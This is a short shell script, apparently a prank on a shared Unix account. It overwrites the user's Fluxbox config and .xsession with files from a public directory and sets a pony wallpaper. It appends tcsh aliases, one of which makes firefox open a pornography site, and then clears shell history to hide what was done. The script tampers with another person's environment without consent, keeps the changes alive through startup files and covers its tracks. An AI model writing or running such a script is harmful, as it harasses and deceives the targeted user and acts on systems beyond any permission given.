#!/bin/sh

if [ ! -d "/home/$USER/.fluxbox/" ]
then
    echo "doesn't have a fluxbox diretory"
    exit 1
fi

cp ~/.fluxbox/init ~/.fluxbox/.youroldinitishere
cp ~/.fluxbox/menu ~/.fluxbox/.oldmenu
cp /u/all/fonten_t/public/.fluxstyle ~/.fluxbox/.fluxstyle
cp /u/all/fonten_t/public/.fluxinit ~/.fluxbox/init
cp /u/all/fonten_t/public/.fluxmenu ~/.fluxbox/menu
cp /u/all/fonten_t/public/poney.jpg ~/.poney.jpg

echo "session.styleFile:	/home/$USER/.fluxbox/.fluxstyle" >> ~/.fluxbox/init

fbsetbg ~/.poney.jpg

if [ -f "/home/$USER/.tcshrc" ]
then
    echo "alias xterm 'xterm -bg pink -fg yellow'" >> ~/.tcshrc
    echo "alias firefox 'firefox www.youporn.com www.youporn.com'" >> ~/.tcshrc
fi

cp ~/.xsession ~/.oldxsession

#/bin/cat ~/.xsession | sed 's/TERM=.*$/TERM="xterm -bg pink -fg yellow"/' > ~/.xsession
cp /u/all/fonten_t/public/.xsession ~/.xsession


history -c
pkill dclock